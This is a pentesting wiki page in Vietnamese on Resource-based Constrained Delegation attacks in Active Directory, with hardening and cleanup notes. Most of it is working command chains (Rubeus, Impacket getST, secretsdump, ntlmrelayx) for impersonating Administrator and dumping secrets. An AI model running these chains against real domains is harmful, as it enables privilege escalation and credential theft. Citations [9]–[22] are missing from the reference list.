# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Kiến thức cơ bản về Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) tương tự [constrained delegation](constrained-delegation.md), nhưng hướng tin cậy bị đảo ngược. Constrained delegation truyền thống ghi lại những dịch vụ mà một principal có thể delegate đến; RBCD ghi lại trên **tài nguyên đích** những principal được phép impersonate người dùng để truy cập tài nguyên đó.<sup>[[12]](#references)</sup>

Thuộc tính _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ của đối tượng đích chứa một security descriptor xác định những principal được phép thay mặt các danh tính khác truy cập tài nguyên đó.

Một điểm khác biệt quan trọng nữa là principal có đủ **quyền ghi trên một machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` và các quyền tương tự) có thể đặt _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Việc cấu hình constrained delegation truyền thống thường đòi hỏi quyền truy cập quản trị cao hơn.<sup>[[1]](#references)</sup>

Cụ thể hơn, việc thay đổi cài đặt constrained delegation cổ điển thường bị giới hạn bởi `SeEnableDelegationPrivilege` trên domain controller; quyền này thường chỉ do các quản trị viên có đặc quyền cao nắm giữ. RBCD chuyển quyền quyết định sang security descriptor của đối tượng đích, vì vậy quyền ghi vào thuộc tính computer object liên quan có thể là đủ mà không cần quyền người dùng đó.<sup>[[1]](#references)[[2]](#references)</sup>

### Khái niệm mới

Cờ **`TrustedToAuthForDelegation`** trong `userAccountControl` thường được mô tả là điều kiện tiên quyết cho **S4U2Self**, nhưng điều đó chưa đầy đủ.\
Một service principal có SPN có thể yêu cầu S4U2Self mà không cần cờ này. Khi có `TrustedToAuthForDelegation`, service ticket trả về sẽ **forwardable**; nếu không, ticket thường **non-forwardable**.<sup>[[5]](#references)</sup>

Constrained delegation truyền thống từ chối **TGS non-forwardable** ở bước S4U2Proxy. RBCD có thể chấp nhận ticket S4U2Self đó nếu security descriptor của đích cho phép service gửi yêu cầu.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Cấu trúc tấn công

> Nếu có **quyền tương đương quyền ghi** trên một **computer account**, bạn có thể giành được quyền truy cập có đặc quyền vào máy đó.

Giả sử kẻ tấn công đã có **quyền tương đương quyền ghi trên victim computer object**.

1. Kẻ tấn công **chiếm quyền kiểm soát** một account có **SPN** hoặc **tạo một account** ("Service A"). Theo mặc định, người dùng domain đã xác thực có thể tạo tối đa 10 computer object, theo cấu hình **_MachineAccountQuota_**; computer object tự động cung cấp các SPN có thể sử dụng.
2. Kẻ tấn công **lạm dụng quyền WRITE** trên victim computer (ServiceB) để cấu hình **resource-based constrained delegation, cho phép ServiceA impersonate bất kỳ người dùng nào** trên victim computer đó (ServiceB).
3. Kẻ tấn công dùng Rubeus để thực hiện **full S4U attack** (S4U2Self và S4U2Proxy) từ Service A đến Service B, với một người dùng **có quyền truy cập đặc quyền vào Service B**.
   1. S4U2Self (từ account SPN bị chiếm quyền kiểm soát hoặc được tạo): yêu cầu một **TGS đại diện cho Administrator đến Service A** (non-forwardable).
   2. S4U2Proxy: dùng **TGS non-forwardable** đó để yêu cầu một service ticket đại diện cho **Administrator** đến **victim host**.
   3. Ticket non-forwardable vẫn có thể hoạt động trong luồng RBCD này vì Service A được cấp quyền trong security descriptor của tài nguyên đích.
4. Kẻ tấn công có thể **pass-the-ticket** và **impersonate** người dùng để giành **quyền truy cập vào victim ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` ngăn cách tạo computer mặc định, nhưng không xóa quyền ghi trên target computer object hoặc quyền kiểm soát một account hiện có. Đôi khi có thể dùng một người dùng thông thường bị kiểm soát nhưng không có SPN làm principal thực hiện delegation thông qua [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), kể cả trong cùng một domain. Cách này vẫn cần quyền ghi RBCD có hiệu lực, quyền kiểm soát thông tin xác thực của người dùng thực hiện delegation, một danh tính bị impersonate có thể được delegate, hành vi mã hóa Kerberos tương thích và việc thay đổi NT hash làm gián đoạn account. Hãy xem đây là các điều kiện tiên quyết riêng biệt; chỉ riêng thuộc tính RBCD trống hoặc quota bằng không không chứng minh được rằng cách này sẽ thành công hay an toàn.

Một RBCD descriptor hiện có cũng có thể chỉ định một **group** thay vì trực tiếp chỉ định computer thực hiện delegation. Nếu bạn kiểm soát một computer account có SPN và có thể thêm account đó vào group này, membership mới có thể tạo ra đường delegation mà không cần thay đổi thuộc tính RBCD của target computer. Hãy kiểm tra ACL ghi membership có hiệu lực của group (bao gồm deny ACE), membership lồng nhau và việc làm mới token, trustee SID trong descriptor, các hạn chế delegation của account bị impersonate, cũng như SPN của target service trước khi kết luận rằng đường này hoạt động.

Để kiểm tra _**MachineAccountQuota**_ của domain, bạn có thể dùng:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Tấn công

### Tạo đối tượng máy tính

Bạn có thể tạo đối tượng máy tính trong miền bằng **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Cấu hình Resource-based Constrained Delegation

**Sử dụng mô-đun Active Directory PowerShell**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Sử dụng powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Thực hiện một cuộc tấn công S4U hoàn chỉnh (Windows/Rubeus)

Trước tiên, chúng ta đã tạo đối tượng Computer mới với mật khẩu `123456`, vì vậy chúng ta cần hash của mật khẩu đó:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Lệnh này sẽ in các hash RC4 và AES của tài khoản đó.\
Bây giờ, có thể thực hiện cuộc tấn công:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Bạn có thể tạo thêm ticket cho nhiều dịch vụ chỉ bằng một lần yêu cầu, sử dụng tham số `/altservice` của Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Người dùng có thể được đánh dấu **"Tài khoản nhạy cảm và không thể ủy quyền."** Nếu bật cờ này, tài khoản không thể bị mạo danh thông qua quy trình ủy quyền này. BloodHound hiển thị thuộc tính này trong quá trình phân tích.

### Công cụ Linux: RBCD từ đầu đến cuối với Impacket (2024+)

Nếu bạn làm việc trên Linux, bạn có thể thực hiện toàn bộ chuỗi RBCD bằng các công cụ Impacket chính thức:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Ghi chú
- Nếu LDAP signing/LDAPS được áp dụng bắt buộc, hãy dùng `impacket-rbcd -use-ldaps ...`.
- Ưu tiên khóa AES; nhiều domain hiện đại hạn chế RC4. Impacket và Rubeus đều hỗ trợ các luồng chỉ dùng AES.
- Impacket có thể viết lại `sname` ("AnySPN") cho một số công cụ, nhưng hãy lấy SPN chính xác bất cứ khi nào có thể (ví dụ: CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Reflective RBCD cho delegator chỉ dùng Kerberos không có SPN

Người dùng bị xâm nhập có **`msDS-AllowedToDelegateTo` nhưng không có SPN hoặc `TrustedToAuthForDelegation`** không thể tạo ticket bằng chứng có thể chuyển tiếp cần thiết cho [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) bằng S4U2Self thông thường.<sup>[[1]](#references)[[18]](#references)</sup> Nếu người dùng đó có thể ghi RBCD lên đối tượng AD **của chính mình**, tài khoản có SPN do attacker kiểm soát có thể ủy quyền *cho người dùng đó* trước.<sup>[[1]](#references)[[18]](#references)</sup> Bước RBCD này tạo ra ticket có thể chuyển tiếp cho người dùng bị giả mạo tới tài khoản không có SPN, ticket này trở thành bằng chứng cho S4U2Proxy thứ hai tới một SPN trong danh sách cho phép ủy quyền kiểu cổ điển của tài khoản bị xâm nhập.<sup>[[18]](#references)[[19]](#references)</sup>

Ở bước đầu tiên không có SPN, yêu cầu S4U2Proxy của tài khoản hỗ trợ phải dùng **U2U**: `enc-tkt-in-skey` khiến KDC mã hóa ticket bằng khóa phiên TGT của delegator thay vì tra cứu khóa SPN.<sup>[[18]](#references)[[19]](#references)</sup> KDC cũng cần bit RBCD trong `PA-PAC-OPTIONS`, TGT của delegator và ticket bằng chứng S4U2Self.<sup>[[18]](#references)[[20]](#references)</sup> Fork `getST.py` Impacket của tác giả bổ sung `-nospn` và `-tgt` cho yêu cầu này; hỗ trợ `-nospn`/`-tgt` nằm trong upstream Impacket PR #2324, vì vậy hãy dùng fork được liên kết thay vì cho rằng `getST.py` bản gốc hỗ trợ bước này.<sup>[[18]](#references)[[20]](#references)</sup>

Ví dụ này giả định `svc_web` đã bị xâm nhập, có thể ghi thuộc tính RBCD của chính nó và được phép ủy quyền tới `host/dc01.corp.local`. Ví dụ cũng giả định có thể tạo tài khoản hỗ trợ có SPN, RC4 được phép và `Administrator` được chọn có thể được ủy quyền. Yêu cầu **RC4 TGT** bằng NT hash của tài khoản bị xâm nhập. Chạy `getST.py` **đầu tiên** từ fork của tác giả; kiểm tra đầu ra `describeTicket.py` và thay **khóa phiên RC4 TGT** của nó vào bên dưới. Lệnh `getST.py` cuối cùng có thể dùng Impacket bản gốc. Thực hiện yêu cầu TGT **trước khi** đổi NT hash; việc đổi này sẽ làm gián đoạn tài khoản dịch vụ cho đến khi đặt lại mật khẩu.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Không giống [SPN-less RBCD route bên dưới](#spn-less-cross-domain--cross-forest-rbcd), chuỗi này dùng tài khoản SPN-less làm **RBCD target, sau đó là classic KCD delegator**. Chuỗi này vẫn cần một tài khoản khác do bạn kiểm soát có SPN. Nếu `MachineAccountQuota=0`, một tài khoản SPN đã được kiểm soát có thể thay thế máy tính mới; chỉ riêng quota bằng 0 không ngăn được đường tấn công này.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD xuyên domain và xuyên forest

Nếu **delegating principal** mà bạn kiểm soát nằm trong **domain khác** (hoặc thậm chí **forest khác**) với **resource computer**, hành vi lạm dụng vẫn là **RBCD**, nhưng luồng ticket không còn theo quy trình `S4U2Self -> S4U2Proxy` thông thường trong một domain.

### RBCD xuyên domain: cấu hình foreign principal bằng SID

Khi bạn đặt `msDS-AllowedToActOnBehalfOfOtherIdentity` từ **domain khác**, máy/người dùng ở domain ngoài có thể **không phân giải được bằng tên** trong LDAP của domain đích. Trong trường hợp đó, hãy cấu hình mục ủy quyền bằng **SID** của foreign principal thay vì sAMAccountName/UPN.

Điều này đặc biệt phù hợp khi relay NTLM tới LDAP bằng `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Ghi chú:
- `--sid` yêu cầu `ntlmrelayx.py` xử lý `--escalate-user` dưới dạng SID; điều này cần thiết khi tài khoản ủy quyền thuộc một domain khác với domain mục tiêu.
- Ngay cả khi công cụ in ra `User not found in LDAP`, thao tác ghi quyền ủy quyền vẫn có thể thành công vì security descriptor lưu trực tiếp SID bên ngoài.

### RBCD liên domain: chuỗi S4U liên realm

Sau khi principal bên ngoài được thêm vào `msDS-AllowedToActOnBehalfOfOtherIdentity`, quy trình liên domain hoạt động như sau:<sup>[[9]](#references)[[13]](#references)</sup>

1. Lấy **TGT** cho principal ủy quyền từ domain của chính principal đó.
2. Yêu cầu **referral TGT** cho `krbtgt/<target-domain>`.
3. Yêu cầu **cross-realm S4U2Self referral** cho người dùng bị mạo danh trên DC của domain mục tiêu.
4. Yêu cầu ticket **S4U2Self** thực tế cho người dùng đó trong domain của bên ủy quyền.
5. Thực hiện **S4U2Proxy** trong domain của bên ủy quyền để lấy referral ticket cho domain mục tiêu.
6. Thực hiện **S4U2Proxy** cuối cùng trên DC của domain mục tiêu để lấy service ticket cho `cifs/host.target`, `host/host.target`, v.v.

Đây là lý do các công cụ Linux có sẵn thường thất bại với RBCD liên domain:<sup>[[9]](#references)</sup>
- **realm** trong yêu cầu có thể cần khác với realm của TGT được dùng trong `TGS-REQ`
- Chuỗi này cần các bước **S4U2Proxy độc lập**, chứ không chỉ có `S4U2Self` hoặc `S4U2Self` theo sau ngay bằng một bước `S4U2Proxy`

### RBCD liên domain từ Linux

Synacktiv đã công bố một bản triển khai `getST.py` của Impacket, tái hiện chuỗi liên realm từ Linux bằng cách xử lý riêng hai KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Về mặt vận hành, các tham số mới là:
- `-dc-ip`: DC của domain **ủy quyền**
- `-targetdomain`: domain của **máy tính tài nguyên**
- `-targetdc`: DC của domain **tài nguyên**

### Các hạn chế của RBCD liên forest

RBCD liên forest có một hạn chế quan trọng: **người dùng bị mạo danh phải thuộc cùng forest với principal ủy quyền**. Nói cách khác, nếu machine account bạn kiểm soát nằm trong `valhalla.local` còn tài nguyên mục tiêu nằm trong `asgard.local`, nhìn chung bạn **không thể mạo danh tùy ý người dùng `asgard.local` để truy cập tài nguyên đó thông qua RBCD**.<sup>[[9]](#references)</sup>

Tuy nhiên, vẫn có thể khai thác nếu:
- người dùng trong **forest ủy quyền** là **local admin** (hoặc có đặc quyền khác) trên host tài nguyên thuộc forest còn lại
- trust cho phép đường dẫn xác thực cần thiết và SID bên ngoài được chấp nhận trong security descriptor của máy tính mục tiêu

### Các điểm khác thường của giao thức RBCD liên forest

RBCD liên forest không chỉ đơn giản là "liên domain cộng thêm trust". Luồng được quan sát có hai điểm khác thường mà các công cụ phổ biến trước đây thường bỏ sót:<sup>[[9]](#references)</sup>

1. Một yêu cầu **S4U2Proxy** bổ sung, đặt **`PA-PAC-OPTIONS=branch-aware`**
2. Ticket dịch vụ cuối cùng có thể được trả về bằng **RC4** ngay cả khi đã yêu cầu các etype khác

Luồng thực tế như sau:

1. Lấy TGT cho principal ủy quyền trong forest A.
2. Yêu cầu **S4U2Self** cho người dùng bị mạo danh trong forest A.
3. Yêu cầu **S4U2Proxy** trong forest A để lấy referral TGT cho forest B.
4. Gửi yêu cầu **S4U2Proxy** thứ hai trong forest A **không kèm ticket S4U2Self dưới dạng additional ticket**, nhưng bật `branch-aware` để lấy một referral TGT khác cho forest B.
5. Tùy chọn, yêu cầu ticket dịch vụ thông thường trong forest B cho principal ủy quyền (ticket này không cần thiết để thực hiện bước khai thác cuối cùng).
6. Dùng các referral ticket từ bước 3 và 4 để yêu cầu ticket **S4U2Proxy** cuối cùng trong forest B, cho người dùng forest A bị mạo danh truy cập SPN mục tiêu.

### RBCD liên forest từ Linux

Nhánh Impacket của Synacktiv bổ sung tùy chọn `-forest` cho logic này:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD đệ quy trong nhiều domain (3+ domains)

Trong **forest nhiều domain**, cả **S4U2Self** và **S4U2Proxy** đều có thể chạy **đệ quy** thay vì dừng lại sau một referral:

- **S4U2Self đệ quy**: `S4U2Self` đầu tiên được gửi đến **domain của người dùng bị mạo danh**; các bước trung gian qua parent/child được thực hiện bằng các referral `TGS-REQ` thông thường cho `krbtgt/<REALM>`, và **`S4U2Self` cuối cùng** được gửi trong **domain riêng của principal ủy quyền**.
- Điều này có nghĩa là **chỉ cần nắm giữ một TGT** cho machine account cũng có thể đủ để mạo danh một **admin từ domain khác trong cùng forest** và yêu cầu `cifs/host`, `host/host`, `wsman/host`, v.v.
- **S4U2Proxy đệ quy** đi theo trust chain theo cách tương tự: các bước trung gian dùng lại ticket trước đó làm TGT trong khi yêu cầu referral `krbtgt/<REALM>` tiếp theo, và chỉ bước cuối cùng mới trả về service ticket cuối cùng.<sup>[[10]](#references)</sup>

Một ví dụ thực tế trong cùng forest là:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD liên miền / liên forest không có SPN

Nếu **principal ủy quyền là người dùng không có SPN**, bước `S4U2Self` đệ quy cuối cùng sẽ thất bại với lỗi **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Cách khắc phục là **chỉ thử lại bước cuối bằng `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Tóm tắt chuỗi khai thác:

1. Xác thực bằng **NT hash** để khiến KDC ưu tiên **RC4-HMAC (etype 23)**.
2. Trước tiên, yêu cầu **`-self -u2u`** và giữ riêng ticket này, không dùng chung với bước proxy sau đó.
3. Trích xuất **khóa phiên TGT** bằng `describeTicket.py`.
4. Thay **NT hash** của người dùng bằng **khóa phiên** đó bằng `changepasswd.py -newhashes <session_key>`.
5. Dùng lại ticket `S4U2Self+U2U` làm **`-additional-ticket`** trong một yêu cầu **`-proxy`** riêng biệt.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Lưu ý khi vận hành:

- Khi **trusted hop đầu tiên đã là một forest khác**, hãy ưu tiên thuật toán **branch-aware** (`getST.py ... -forest`) để khớp với hành vi gốc của Windows. Nếu foreign forest chỉ xuất hiện ở một chặng sau trong chuỗi, luồng đệ quy không branch-aware vẫn có thể hoạt động.<sup>[[9]](#references)</sup>
- Trên các DC **Windows Server 2022/2025** gần đây, việc ép dùng RC4 có thể thất bại với **`KDC_ERR_ETYPE_NOSUPP`** do RC4 bị loại bỏ; điều này có thể khiến **RBCD không cần SPN** không khả thi, dù RBCD cổ điển dựa trên SPN vẫn hoạt động với AES.<sup>[[15]](#references)</sup>
- Chạy **`S4U2Self+U2U` trước khi thay đổi hash/mật khẩu của user**: **`SamrChangePasswordUser`** không tính toán lại các khóa Kerberos AES của account, vì vậy đổi mật khẩu trước có thể khiến các yêu cầu ticket sau đó thất bại.<sup>[[14]](#references)</sup>
- Account bị mạo danh vẫn phải **được phép delegable**: **Protected Users** và các account có **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** sẽ chặn chuỗi này.

## Ghi chú về phát hiện / hardening

- Các đường dẫn RBCD qua domain/forest thường vẫn được tạo thông qua **lạm dụng ACL** hoặc **relay-to-LDAP**. Bật **LDAP signing** và **LDAP channel binding** trên DC để chặn các cách thiết lập phổ biến.
- Kiểm tra ai có quyền ghi **`msDS-AllowedToActOnBehalfOfOtherIdentity`** trên các computer object và phân giải các SID được lưu trữ, bao gồm cả **foreign security principals**.
- Trong các môi trường có nhiều trust, hãy rà soát **Selective Authentication**, **SID filtering** và việc user từ foreign forest có quyền **local admin** trên các host tài nguyên hay không.

### Truy cập

Dòng lệnh cuối cùng sẽ thực hiện **cuộc tấn công S4U hoàn chỉnh và inject TGS** từ Administrator vào **bộ nhớ** của victim host.\
Trong ví dụ này, một TGS cho dịch vụ **CIFS** đã được yêu cầu từ Administrator, vì vậy bạn sẽ có thể truy cập **C$**:

```bash
ls \\victim.domain.local\C$
```

### Lạm dụng các service ticket khác nhau

Tìm hiểu về [**các service ticket hiện có tại đây**](silver-ticket.md#available-services).

## Liệt kê, kiểm tra và dọn dẹp

### Liệt kê các máy tính đã cấu hình RBCD

PowerShell (giải mã SD để phân giải SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (đọc hoặc xóa bằng một lệnh):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Dọn dẹp / đặt lại RBCD

- PowerShell (xóa thuộc tính):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Lỗi Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Điều này có nghĩa là Kerberos được cấu hình không sử dụng DES hoặc RC4, trong khi bạn chỉ cung cấp hash RC4. Hãy cung cấp cho Rubeus ít nhất hash AES256 (hoặc cung cấp cả hash RC4, AES128 và AES256). Ví dụ: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** khi dùng `-self` với tài khoản người dùng thông thường: principal ủy quyền có thể **không có SPN**. Hãy thử lại **hop cuối** bằng **`S4U2Self+U2U`** thay vì `S4U2Self` thông thường.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** khi dùng **RBCD không có SPN**: các DC mới hơn có thể từ chối luồng **RC4-HMAC** bị buộc dùng, vốn cần thiết cho thủ thuật `S4U2Self+U2U` + thay thế session key. Thay vào đó, hãy thử luồng RBCD **có SPN** thông thường với AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Điều này có nghĩa là thời gian trên máy tính hiện tại khác với thời gian trên DC, khiến Kerberos hoạt động không đúng cách.
- **`preauth_failed`**: Điều này có nghĩa là username + hash được cung cấp không thể dùng để đăng nhập. Có thể bạn đã quên thêm "$" vào username khi tạo hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** khi dùng S4U2Proxy: Kiểm tra các giới hạn ủy quyền của tài khoản bị mạo danh, cờ forwardable của evidence ticket và xem liệu KCD thông thường hay descriptor RBCD của mục tiêu có cho phép hop này hay không. Đây là **lỗi chính sách ủy quyền của KDC**, không phải phép thử xem dịch vụ mục tiêu có đang chạy hay người dùng có quyền truy cập ở cấp ứng dụng hay không. SPN mục tiêu chưa đăng ký thường gây ra **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** thay vào đó.<sup>[[21]](#references)[[22]](#references)</sup>

## Ghi chú, relay và các phương án thay thế

- Bạn cũng có thể ghi RBCD SD qua AD Web Services (ADWS) nếu LDAP bị lọc. Xem:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Các chuỗi Kerberos relay thường kết thúc bằng RBCD để đạt được quyền SYSTEM cục bộ chỉ trong một bước. Xem các ví dụ thực tế từ đầu đến cuối:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Nếu LDAP signing/channel binding **bị tắt** và bạn có thể tạo machine account, các công cụ như **KrbRelayUp** có thể relay Kerberos auth bị ép buộc đến LDAP, đặt `msDS-AllowedToActOnBehalfOfOtherIdentity` cho machine account của bạn trên computer object mục tiêu, rồi lập tức mạo danh **Administrator** qua S4U từ máy bên ngoài host.<sup>[[8]](#references)</sup>

## References

- [1] [Vẫy đuôi chó: Lạm dụng Resource-Based Constrained Delegation để tấn công Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Một góc nhìn khác về Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Resource-based Constrained Delegation trong Kerberos: Chiếm quyền Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Lạm dụng Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity đã hạ gục Domain: Tổng quan về Kerberos từ góc độ tấn công](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (chính thức)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet Linux nhanh với cú pháp mới](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (tắt LDAP signing → Kerberos relay đến RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
